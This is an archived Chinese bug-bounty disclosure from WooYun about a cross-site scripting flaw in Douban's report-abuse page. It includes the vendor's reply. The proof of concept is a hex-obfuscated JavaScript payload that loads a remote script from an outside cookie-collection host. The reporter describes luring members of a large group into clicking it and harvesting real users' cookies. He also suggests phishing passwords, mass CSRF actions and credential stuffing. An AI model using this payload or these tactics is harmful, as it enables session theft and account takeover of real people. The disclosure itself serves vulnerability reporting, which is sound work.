<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		豆瓣网举报约炮包养帖子引发的跨站攻击事件  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		豆瓣网举报约炮包养帖子引发的跨站攻击事件  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/华莱士">华莱士</a> 
</li><li>提交时间：		2014-01-09 14:01</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2014-01-09：	细节已通知厂商并且等待厂商处理中<br/>
									2014-01-09：	厂商已经确认，细节仅向厂商公开<br/>
									2014-01-19：	细节向核心白帽子及相关领域专家公开<br/>
									2014-01-29：	细节向普通白帽子公开<br/>
									2014-02-08：	细节向实习白帽子公开<br/>
									2014-02-23：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">豆瓣一页面控制不严导致可跨站钓密码.分分钟见效</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">上午闲来没事刷豆瓣,又看熟悉有偿约炮帖,明码标价,应求无数,习惯性的去举报.然后发现:http://www.douban.com/misc/audit_report?url= <br />
<br />
举报不良信息的页面传入内容控制不严格没有过滤掉javascript:标签,导致会在当前页面输出跨站内容甚至钓鱼内容,于是构造了一个xss页,但缺点是需要访问才会触发.不过这并不是难题,只需要一点技巧就行了.<br />
<br />
</p><p class="detail"><a href="../images/0912284299fd2520639833c6858bc93cf0a5b53a.jpg" target="_blank"><img src="../images/0912284299fd2520639833c6858bc93cf0a5b53a.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
<br />
例如这个示范中我找了个豆瓣里平均智商为负的小组,叫傻逼组,人数有整整40万+,我随便想了个标题,修改了下截图发了个帖子,守着一群心怀不轨的人去访问主页看xx图.<br />
<br />
</p><p class="detail"><a href="../images/091231021aaccf6e1ff021ff8824891e04d96bab.jpg" target="_blank"><img src="../images/091231021aaccf6e1ff021ff8824891e04d96bab.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
<br />
之后几乎是帖子发出去的同时,收信数量开始涨了,效果见图,这速率一天上千个cookie没问题,见到效果就删帖了.其实还可以构造在点链接的时候在当前页面打印出一个钓密码的页面同时保持地址栏不变,或是csrf进行批量删动态操作之类的行为,发广播,具体看各自的玩法吧.还有,考虑到逼组接近草榴的三观,如果再没下限点随便来点敏感词效果会翻个几倍<br />
<br />
</p><p class="detail"><a href="../images/09123616122dd2a87d64162498942b3e02924d4d.jpg" target="_blank"><img src="../images/09123616122dd2a87d64162498942b3e02924d4d.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/091236296ddf9872c9899dc314103770f8947d89.jpg" target="_blank"><img src="../images/091236296ddf9872c9899dc314103770f8947d89.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
<br />
</p><p class="detail"><a href="../images/09124211a5890fa807c37a38a71d7d792bb05d4a.jpg" target="_blank"><img src="../images/09124211a5890fa807c37a38a71d7d792bb05d4a.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
<br />
cookie字段里似乎包含注册邮箱,可以尝试撞库 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">http://www.douban.com/misc/audit_report?url=javascript: /*你们要知道,美国的华莱士比起你们不知道高到哪里去啦我和他谈笑风生,你们哪、图样图森破,不要见得分是得雨,随便搞些新闻来指摘我,你们以为字数限制可以阻挡的了我吗?老子随便发个消息都是通篇的刷屏,老子签名两千多字,一个动态就翻你们两页,所以说,豆瓣那套理论你们虽然很清楚,但毕竟,你们还是太年轻!!!*/eval(%22\x78\x3d\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74\x28\x27\x73\x63\x72\x69\x70\x74\x27\x29\x3b\x78\x2e\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65\x28\x27\x73\x72\x63\x27\x2c\x20\x27\x68\x74\x74\x70\x3a\x2f\x2f\x78\x73\x73\x2e\x74\x77\x2f\x33\x34\x36\x34\x27\x29\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x63\x75\x6d\x65\x6e\x74\x45\x6c\x65\x6d\x65\x6e\x74\x2e\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64\x28\x78\x29%22)<br />
<br />
<br />
<br />
登陆状态下访问用户链接可抓包看效果 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">过滤..如果无视的话也请别偷偷修复.不理会我还可以继续发掘着玩嘛<br />
<br />
<br />
<br />
另外再反应一下,几个万人小组里包养和XX有偿交易帖子实在太瞎眼,价格谈不拢开喷的帖子隔天一刷,这完全违背豆瓣社会的分享与交流兴趣爱好的初衷了吧.希望能对特定组进行治理.举报时常无果.借此处反应一下 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/华莱士" title="华莱士">华莱士</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048381" title="豆瓣网举报约炮包养帖子引发的跨站攻击事件">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：10 </p>
													<p class="detail">确认时间：2014-01-09 14:47</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">谢谢反馈。立即组织修复〜</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="48381";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
